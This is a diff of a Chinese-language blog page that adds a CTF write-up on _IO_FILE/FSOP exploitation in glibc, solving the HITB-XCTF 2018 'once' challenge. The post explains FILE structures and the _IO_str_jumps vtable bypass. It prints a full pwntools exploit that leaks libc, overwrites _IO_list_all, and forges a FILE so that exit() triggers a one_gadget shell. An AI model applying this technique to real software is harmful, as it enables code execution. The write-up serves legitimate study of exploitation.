@@ -6,18 +6,32 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://GD.com">
-  <title>Archives | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="a GOOD pwner">
-<meta property="og:type" content="website">
+  <meta name="description" content="通过一道pwn题探究_IO_FILE结构攻击利用(原文首发自安全客)前言前一段时间学了IO-file的知识，发现在CTF中IO_file也是一个常考的知识点，这里我就来总结一下IO_file的知识点，顺便可以做一波笔记。首先讲一下IO_file的结构体，然后其利用的方法，最后通过一道HITB-XCTF 2018 GSEC once的题目来加深对IO_file的理解。 libc2.23 版本的IO_">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://GD.com/archives/index.html">
+<meta property="og:url" content="http://GD.com/2018/11/20/house/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="a GOOD pwner">
+<meta property="og:description" content="通过一道pwn题探究_IO_FILE结构攻击利用(原文首发自安全客)前言前一段时间学了IO-file的知识，发现在CTF中IO_file也是一个常考的知识点，这里我就来总结一下IO_file的知识点，顺便可以做一波笔记。首先讲一下IO_file的结构体，然后其利用的方法，最后通过一道HITB-XCTF 2018 GSEC once的题目来加深对IO_file的理解。 libc2.23 版本的IO_">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://gd.com/2018/11/20/house/2.png">
+<meta property="og:image" content="http://gd.com/2018/11/20/house/3.jpg">
+<meta property="og:image" content="http://gd.com/2018/11/20/house/4.jpg">
+<meta property="og:image" content="http://gd.com/2018/11/20/house/5.jpg">
+<meta property="og:image" content="http://gd.com/2018/11/20/house/6.jpg">
+<meta property="og:image" content="http://gd.com/2018/11/20/house/7.jpg">
+<meta property="og:image" content="http://gd.com/2018/11/20/house/8.jpg">
+<meta property="og:image" content="http://gd.com/2018/11/20/house/9.jpg">
+<meta property="og:image" content="http://gd.com/2018/11/20/house/10.jpg">
+<meta property="og:image" content="http://gd.com/2018/11/20/house/11.jpg">
+<meta property="og:image" content="http://gd.com/2018/11/20/house/12.jpg">
+<meta property="og:image" content="http://gd.com/2018/11/20/house/13.jpg">
+<meta property="og:updated_time" content="2018-11-20T12:09:28.205Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Hexo">
-<meta name="twitter:description" content="a GOOD pwner">
+<meta name="twitter:description" content="通过一道pwn题探究_IO_FILE结构攻击利用(原文首发自安全客)前言前一段时间学了IO-file的知识，发现在CTF中IO_file也是一个常考的知识点，这里我就来总结一下IO_file的知识点，顺便可以做一波笔记。首先讲一下IO_file的结构体，然后其利用的方法，最后通过一道HITB-XCTF 2018 GSEC once的题目来加深对IO_file的理解。 libc2.23 版本的IO_">
+<meta name="twitter:image" content="http://gd.com/2018/11/20/house/2.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -153,118 +167,190 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-house" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="通过一道pwn题探究-IO-FILE结构攻击利用"><a href="#通过一道pwn题探究-IO-FILE结构攻击利用" class="headerlink" title="通过一道pwn题探究_IO_FILE结构攻击利用"></a>通过一道pwn题探究_IO_FILE结构攻击利用</h1><h1 id="原文首发自安全客"><a href="#原文首发自安全客" class="headerlink" title="(原文首发自安全客)"></a>(原文首发自安全客)</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前一段时间学了IO-file的知识，发现在CTF中IO_file也是一个常考的知识点，这里我就来总结一下IO_file的知识点，顺便可以做一波笔记。首先讲一下IO_file的结构体，然后其利用的方法，最后通过一道HITB-XCTF 2018 GSEC once的题目来加深对IO_file的理解。</p>
+<h1 id="libc2-23-版本的IO-file利用"><a href="#libc2-23-版本的IO-file利用" class="headerlink" title="libc2.23 版本的IO_file利用"></a>libc2.23 版本的IO_file利用</h1><p>这是一种控制流劫持技术，攻击者可以利用程序中的漏洞覆盖file指针指向能够控制的区域，从而改写结构体中重要的数据，或者覆盖vtable来控制程序执行流。</p>
+<h2 id="IO-file结构体"><a href="#IO-file结构体" class="headerlink" title="IO_file结构体"></a>IO_file结构体</h2><p>在ctf中调用setvbuf()，stdin、stdout、stderr结构体一般位于libc数据段，其他大多数的FILE 结构体保存在堆上，其定义如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE &#123;</span><br><span class="line">  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="line">#define _IO_file_flags _flags</span><br><span class="line"></span><br><span class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br><span class="line">  char* _IO_read_ptr;    /* Current read pointer */</span><br><span class="line">  char* _IO_read_end;    /* End of get area. */</span><br><span class="line">  char* _IO_read_base;    /* Start of putback+get area. */</span><br><span class="line">  char* _IO_write_base;    /* Start of put area. */</span><br><span class="line">  char* _IO_write_ptr;    /* Current put pointer. */</span><br><span class="line">  char* _IO_write_end;    /* End of put area. */</span><br><span class="line">  char* _IO_buf_base;    /* Start of reserve area. */</span><br><span class="line">  char* _IO_buf_end;    /* End of reserve area. */</span><br><span class="line">  /* The following fields are used to support backing up and undo. */</span><br><span class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line"></span><br><span class="line">  struct _IO_marker *_markers;</span><br><span class="line"></span><br><span class="line">  struct _IO_FILE *_chain;</span><br><span class="line"></span><br><span class="line">  int _fileno;</span><br><span class="line">#if 0</span><br><span class="line">  int _blksize;</span><br><span class="line">#else</span><br><span class="line">  int _flags2;</span><br><span class="line">#endif</span><br><span class="line">  _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small.  */</span><br><span class="line"></span><br><span class="line">#define __HAVE_COLUMN /* temporary */</span><br><span class="line">  /* 1+column number of pbase(); 0 is unknown. */</span><br><span class="line">  unsigned short _cur_column;</span><br><span class="line">  signed char _vtable_offset;</span><br><span class="line">  char _shortbuf[1];</span><br><span class="line"></span><br><span class="line">  /*  char* _save_gptr;  char* _save_egptr; */</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>FILE结构体会通过struct _IO_FILE *_chain链接成一个链表，64位程序下其偏移为0x60，链表头部用_IO_list_all指针表示。如下图所示</p>
+<p><img src="/2018/11/20/house/2.png" alt="2"></p>
+<p>IO_file结构体外面还被一个IO_FILE_plus结构体包裹着，其定义如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中包含了一个重要的虚表*vtable，它是IO_jump_t 类型的指针,偏移是0xd8，保存了一些重要的函数指针，我们一般就是改这里的指针来控制程序执行流。其定义如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_jump_t</span><br><span class="line">&#123;</span><br><span class="line">    JUMP_FIELD(size_t, __dummy);</span><br><span class="line">    JUMP_FIELD(size_t, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    /* showmany */</span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">#if 0</span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line">#endif</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h2 id="利用方法（FSOP）"><a href="#利用方法（FSOP）" class="headerlink" title="利用方法（FSOP）"></a>利用方法（FSOP）</h2><p>这是利用程序中的漏洞（如unsorted bin attack）来覆盖_IO_list_all(全局变量)来使链表指向一个我们能够控制的区域，从而改写虚表*vtable。通过调用  _IO_flush_all_lockp()函数来触发,，该函数会在下面三种情况下被调用：</p>
+<p>1：当 libc 执行 abort 流程时。</p>
+<p>2：当执行 exit 函数时。当执行流从 main 函数返回时</p>
+<p>3：当执行流从 main 函数返回时</p>
+<p>当 glibc 检测到内存错误时，会依次调用这样的函数路径：malloc_printerr -&gt;</p>
+<p><strong> </strong>libc_message-&gt;__GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</p>
+<p>要让正常控制执行流，还需要伪造一些数据，我们看下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)   </span><br><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">       || (_IO_vtable_offset (fp) == 0</span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure>
+<p>这时我们伪造 fp-&gt;_mode = 0，  fp-&gt;_IO_write_ptr &gt;  fp-&gt;_IO_write_base就可以通过验证</p>
+<h1 id="新版本下的利用"><a href="#新版本下的利用" class="headerlink" title="新版本下的利用"></a>新版本下的利用</h1><p>新版本（libc2.24以上）的防御机制会检查vtable的合法性，不能再像之前那样改vatable为堆地址，但是_IO_str_jumps是一个符合条件的  vtable，改  vtable为 _IO_str_jumps即可绕过检查。其定义如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">const struct _IO_jump_t _IO_str_jumps libio_vtable =</span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>其中 _IO_str_overflow 函数会调用   FILE+0xe0处的地址。这时只要我们将虚表覆盖为 _ IO_str_jumps将偏移0xe0处设置为one_gadget即可。</p>
+<p>还有一种就是利用io_finish函数，同上面的类似， io_finish会以   _IO_buf_base处的值为参数跳转至 FILE+0xe8处的地址。执行  fclose（ fp）时会调用此函数，但是大多数情况下可能不会有 fclose（fp），这时我们还是可以利用异常来调用 io_finish，异常时调用  _ IO_OVERFLOW</p>
+<p>是根据IO_str_overflow在虚表中的偏移找到的， 我们可以设置vtable为_IO_str_jumps-0x8异常时会调用io_finish函数。</p>
+<h1 id="具体题目（HITB-XCTF-2018-GSEC-once）"><a href="#具体题目（HITB-XCTF-2018-GSEC-once）" class="headerlink" title="具体题目（HITB-XCTF 2018 GSEC once）"></a>具体题目（HITB-XCTF 2018 GSEC once）</h1><h2 id="1、先简单运行一下程序，查看保护"><a href="#1、先简单运行一下程序，查看保护" class="headerlink" title="1、先简单运行一下程序，查看保护"></a>1、先简单运行一下程序，查看保护</h2><p>主要开启了CANARY和NX保护，不能改写GOT表</p>
+<p><img src="/2018/11/20/house/3.jpg" alt="3"></p>
+<p><img src="/2018/11/20/house/4.jpg" alt="4"></p>
+<h2 id="2、ida打开，反编译"><a href="#2、ida打开，反编译" class="headerlink" title="2、ida打开，反编译"></a>2、ida打开，反编译</h2><p>这里当输入一个不合法的选项时，就会输出puts的地址，用于泄露libc的基地址。</p>
+<p><img src="/2018/11/20/house/5.jpg" alt="5"></p>
+<p>第一个函数是创建一个chunk保存数据</p>
+<p><img src="/2018/11/20/house/6.jpg" alt="6"></p>
+<p><img src="/2018/11/20/house/7.jpg" alt="7"></p>
+<p>第二个函数和第三个函数只能执行一次，有个任意地址写漏洞，这时我们可以利用第二个函数改写off_202038+3d为_IO_list_all-0x10，然后分别执行第三和第一个函数，最后_IO_list_all就会指向0x555555757040的位置</p>
+<p><img src="/2018/11/20/house/8.jpg" alt="8"></p>
+<p><img src="/2018/11/20/house/9.jpg" alt="9"></p>
+<p>第四个函数主要是对堆块的操作，我们可以利用利用这个函数伪造一个_IO_FILE结构</p>
+<p><img src="/2018/11/20/house/10.jpg" alt="10"></p>
+<h2 id="3、具体过程"><a href="#3、具体过程" class="headerlink" title="3、具体过程"></a>3、具体过程</h2><p>1、泄露libc，输入一个“6”即可得到puts函数的地址，然后酸算出libc基地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;6&apos;)</span><br><span class="line">p.recvuntil(&apos;Invalid choice\n&apos;)</span><br><span class="line">ioputadd=int(p.recvuntil(&apos;&gt;&apos;,drop=True),16)</span><br><span class="line">print hex(ioputadd)</span><br><span class="line">libcbase=ioputadd-libc.symbols[&apos;_IO_puts&apos;]</span><br><span class="line">print hex(libcbase)</span><br><span class="line">one=libcbase+0x4526a</span><br></pre></td></tr></table></figure>
+<p>2、利用任意地址写改写_IO_list_all为堆的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">ioall=libcbase+libc.symbols[&apos;_IO_list_all&apos;]-0x10</span><br><span class="line">print hex(ioall)</span><br><span class="line">payload=p64(ioall)*4</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br></pre></td></tr></table></figure>
+<p> <img src="/2018/11/20/house/11.jpg" alt="11"></p>
+<p>3、这时只要我们再利用第四个函数伪造__IO_FILE结构体，改写vtable为_IO_str_jumps，file+0xe0设置</p>
+<p>为one_gadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;input size:\n&apos;)</span><br><span class="line">p.sendline(&apos;256&apos;)</span><br><span class="line"></span><br><span class="line">jump=libcbase+libc.symbols[&apos;_IO_file_jumps&apos;]+0xc0  #_IO_str_jumps</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">payload=&apos;\0&apos;*0xa8+p64(jump)+p64(one)</span><br><span class="line">payload+=&apos;\0&apos;*(0x100-len(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;4&apos;)</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/11/20/house/12.jpg" alt="12"></p>
+<p>4、输入“5”，执行exit()函数触发one_gadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;5&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/11/20/house/13.jpg" alt="13"></p>
+<h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#context.log_level=True</span><br><span class="line">p=process(&apos;./once&apos;)</span><br><span class="line">elf=ELF(&apos;once&apos;)</span><br><span class="line">libc=ELF(&apos;libc6_2.23-0ubuntu10_amd64.so&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;6&apos;)</span><br><span class="line">p.recvuntil(&apos;Invalid choice\n&apos;)</span><br><span class="line">ioputadd=int(p.recvuntil(&apos;&gt;&apos;,drop=True),16)</span><br><span class="line">print hex(ioputadd)</span><br><span class="line">libcbase=ioputadd-libc.symbols[&apos;_IO_puts&apos;]</span><br><span class="line">print hex(libcbase)</span><br><span class="line">one=libcbase+0x4526a</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">ioall=libcbase+libc.symbols[&apos;_IO_list_all&apos;]-0x10</span><br><span class="line">print hex(ioall)</span><br><span class="line">payload=p64(ioall)*4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">#</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;input size:\n&apos;)</span><br><span class="line">p.sendline(&apos;256&apos;)</span><br><span class="line"></span><br><span class="line">jump=libcbase+libc.symbols[&apos;_IO_file_jumps&apos;]+0xc0 #_IO_str_jumps</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">payload=&apos;\0&apos;*0xa8+p64(jump)+p64(one)</span><br><span class="line">payload+=&apos;\0&apos;*(0x100-len(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;5&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive（）</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/20/house/" class="archive-article-date">
-  	<time datetime="2018-11-20T12:03:46.412Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-20</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://GD.com/2018/11/20/house/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/20/rop/" class="archive-article-date">
-  	<time datetime="2018-11-20T09:52:38.320Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-20</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/10/18/calendar/" class="archive-article-date">
-  	<time datetime="2018-10-18T05:11:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-18</time>
-</a>
-        </div>
-    	 
+<nav id="article-nav">
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/10/18/calendar/">calendar</a>
-    </h1>
+  
+    <a href="/2018/11/20/rop/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
